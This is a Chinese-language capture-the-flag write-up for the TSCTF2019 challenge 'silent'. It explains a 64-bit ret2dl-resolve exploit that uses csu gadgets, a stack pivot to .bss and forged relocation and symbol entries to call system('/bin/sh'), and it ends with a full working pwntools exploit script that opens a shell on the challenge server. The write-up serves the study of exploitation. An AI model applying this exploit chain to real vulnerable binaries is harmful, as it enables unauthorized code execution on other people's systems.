---
title: silent
categories:
- TSCTF2019
---
# tsctf2019->silent

## 程序逻辑

程序中没有给泄露地址的函数，但是给了*(0x601008+0x1c8) = 0这个提示，说明需要用ret2-dl-resolve。

vuln有溢出，可以多写0x60个字节

![main](./1.jpg)

![vuln](./2.jpg)

## 漏洞利用

这里的rop链用csu gadgets构造，但是栈溢出的长度不够(少0x18个字节)，导致最后没法ret到bss_addr。这里可以观察vuln停在leave时候寄存器的状态，rbx = 0，之后执行
```x86asm
mov rsp,rbp
pop rbp
```
如果我们把rbp置为p64(1)即可省去0x10个字节，这是一个技巧。另外可以用retn to vuln来执行二次构造，第一次的rop负责输入r12、r13、r14和r15，第二次的rop负责mov并执行，最后用
```x86asm
pop rbp,bss_stage-8
ret
leave
ret
```
去执行bss_stage的代码

buf的结构如下：
```py
buf = p64(pop_rdi_ret) + p64(addr_cmd)
buf += p64(plt0) + p64(index_offset)
buf = buf.ljust(0x300,'b')
buf += fake_rel
buf = buf.ljust(0x340,'b')
buf += 'c'*padding
buf += fake_sym
buf += 'system\x00'
buf += '/bin/sh\x00'
buf = buf.ljust(0x500,'b')
```
即先将'/bin/sh\x00'读到rdi里以作为system的参数，之后plt0调用push，jmp的命令去link_map，index_offset为fake_rel与rel_plt的距离除以0x18，为了方便，我挑了一个不需要填充的fake_rel。

plt0找到fake_rel后通过r_info找到fake_sym，这里同样要除以0x18，这是和32位的不同，r_info的构造方式如下：
```py
r_info = (((fake_sym_addr - dynsym) / 0x18) << 0x20) | 0x7
```
这里为了方便我的fake_sym_addr也选择了一个不需要填充的地址。
r_offset选择elf.got['__libc_start_main']，这是之后system会覆盖的函数地址,r_addend为0，fake_rel结构如下：
```py
fake_rel = p64(r_offset) + p64(r_info) + r_addend
```

找到fake_sym之后，dl_reovel_runtime会根据其st_name字段找到需要执行的函数名，这里是'system'，寻址方式是字符串地址 - dynstr段地址，fake_sym的结构如下
```py
fake_sym = p32(st_name) + p32(0x12) + p64(0) * 2
```

## exp.py

```py
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
from pwn import log
from pwn import remote
from pwn import ELF
debug = 0
offset = 0x78
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']

rop = ROP('./silent')
addr_stage = rop.section('.bss') + 0x1000
print 'addr stage => ' + hex(addr_stage)
ptr_ret = rop.search(rop.section('.fini'))
'''
buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)
#log.success('first data => ' + repr(buf))
print len(buf)
'''
csu_end_addr = 0x40060c
csu_begin_addr = 0x4005f0
pop_ebp_ret = 0x400490
leave_ret_addr = 0x40054a
ret_addr = 0x4003e1
pop_rdi_ret = 0x400613
#payload = 'a'*5 + 'b'*0x78 + p64(csu_end_addr) + p64(0) + p64(1) + p64(0x601018) + p64(0x190) + p64(addr_stage) + p64(0)
#payload += p64(cus_begin) + 'a'*8 + p64(0) + '\x38\x14\x60'
elf = ELF('./silent')

if debug:
    p = process('./silent')
    gdb.attach(p,'b *0x40054a')
    pass
else:
    p =remote('10.112.100.47',8001)
vuln_addr = 0x400526
read_got = 0x601018
addr_link_map = 0x601008                                                                                                                          
addr_dt_debug = addr_link_map + 0x1c8
payload = 'a'*0x30+p64(addr_stage)+'a'*0x38+p64(1)+p64(csu_end_addr) + p64(0x601018) + p64(0x500) + p64(addr_stage) + p64(0)#0xb0
payload += p64(vuln_addr)#0xb8
p.send(p64(read_got)[:-1])
#p.send(p32(len(buf))+'a'+buf)
p.send(payload)
#seoncd
payload = "x"*0x70 + p64(1) + p64(csu_begin_addr)+'a'*0x38+p64(pop_ebp_ret)+p64(addr_stage-8)+p64(leave_ret_addr)
raw_input()
p.send(payload)

#print "[+] read: %r" % p.read(len(buf))
#addr_link_map = p.read_p64()
'''
buf = rop.call_chain_ptr(
    ['read', 0, addr_dt_debug, 8],
    [ptr_ret, addr_stage+400]
)
buf += rop.dl_resolve_call(addr_stage+300)
buf += rop.fill(300, buf)
buf += rop.dl_resolve_data(addr_stage+300, 'system')
buf += rop.fill(400, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(420, buf)
'''
plt0 = 0x4003f0
rel_plt = 0x400398
log.success('rel_plt => ' + hex(rel_plt))
dynsym = 0x4002B8
log.success('dynsym => ' + hex(dynsym))
dynstr = 0x400318
log.success('dynstr => ' + hex(dynstr))
#
#addr_stage 0x602040
main_got = elf.got['__libc_start_main']
fake_rel_addr = addr_stage + 0x300
fake_sym_addr = addr_stage + 0x340
index_offset = (fake_rel_addr - rel_plt) / 0x18#fake index of rel
r_offset = main_got
r_addend = p64(0)
index_dynsym = (fake_sym_addr - dynsym) 
padding = 0x18 - ((fake_sym_addr-dynsym) % 0x18)
fake_sym_addr += padding
##
fake_str_addr = fake_sym_addr + 24
##
r_info = (((fake_sym_addr - dynsym) / 0x18) << 0x20) | 0x7
fake_rel = p64(r_offset) + p64(r_info) + r_addend
cmd = '/bin/sh'
addr_cmd = fake_str_addr + 7
st_name = fake_str_addr - dynstr
fake_sym = p32(st_name) + p32(0x12) + p64(0) * 2
buf = p64(pop_rdi_ret) + p64(addr_cmd)
buf += p64(plt0) + p64(index_offset)
buf = buf.ljust(0x300,'b')
buf += fake_rel
buf = buf.ljust(0x340,'b')
buf += 'c'*padding
buf += fake_sym
buf += 'system\x00'
buf += '/bin/sh\x00'
buf = buf.ljust(0x500,'b')
p.send(buf)
raw_input()
p.interactive()

```
